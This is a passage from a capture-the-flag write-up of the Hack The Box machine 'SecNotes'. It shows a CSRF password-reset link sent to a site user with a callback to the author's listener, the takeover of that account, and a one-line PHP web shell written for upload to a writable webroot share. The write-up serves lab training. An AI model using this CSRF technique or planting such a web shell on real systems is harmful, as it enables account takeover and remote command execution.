SecNotes was a medium difficulty Windows box. Being an earlier HTB box it wasn't as involved as some of the more recent medium boxes. The initial foothold involved getting finding credentials to access a share over SMB which can be done via an XSRF or a second order SQL injection. The share is the webroot of a development site into which we can write a PHP reverse shell. The privilege escalation involved finding credentials in a history file in Windows Subsystem for Linux from which we can psexec into the box as the administrator. I'll also look into the artifacts psexec leaves behind.

I'll first run a port scan against the box using my alias `fscan`

<img src="images/fscan.png">

We see ports 80,445,8808 are open. Ports 80 and 8808 are running `Microsoft IIS httpd 10.0` though nmap shows a redirect to `login.php` on port 80.

Visiting the website shows a login form with an option to signup

<img src="images/secnoteslogin.png">

I'll signup with the credentials `max:password`

<img src="images/signup.png">

Logging in presents us with the option to create a new note, change our password, signout or contact someone on the backend of the site. The second and last options present us with some opportunities. Perhaps we could change the password of another user then access their notes, or perform an attack against someone checking the contact messages, or both!

<img src="images/home.png">

The contact form sends a message to `tyler@secnotes.htb`. If tyler is clicking on links we may be able to perform XSS/XSRF

<img src="images/contact.png">

First I'll check the logic behind changing the password. I'll change my password to `password1` and intercept the request in burpsuite

<img src="images/changepwdpost.png">

Note that the current password is not included anywhere in the request, and there's no XSRF token generated prior to making the request. I'll send it over to repeater and change the request method to a `GET` and submit the request.

<img src="images/changepwdget.png">

We get a 200 OK after a 302 redirect. I'll logout and try logging in with `max:password1`

<img src="images/home.png">

Changing the password worked with a GET request. What I'll do now is to send tyler the URL I submitted to the server to change my password via the contact form, and if he visits it, his password will change provided his browser has cached an authenticated session to the site.

<img src="images/tyler.png">

I'll submit the link `http://10.10.10.97/change_pass.php?password=password2&confirm_password=password2&submit=submit` in the contact form follwed by `http://10.10.14.31/done` and start a netcat listener on port 80, so if I get a request through for `/done` I'll know Tyler visited the malicious link.

<img src="images/done.png">

On my listener I get a connection and I can now login with `tyler:password` and access his notes.

<img src="images/pwreset.png">

We see a note for `new site`. This is likely referring to the site on port 8808. It appears to contains credentials for the share `\\secnotes.htb\new-site`. I'll check access with `smbmap`

<img src="images/new-site.png">

We have write access over the `new-site` share. Visiting the share with `smbclient` shows we're in the webroot of the site on port 8808.

<img src="images/iis.png">

I'll create a php script containing
```
<?php system($_REQUEST['cmd']); ?>
```
and upload it to the share.
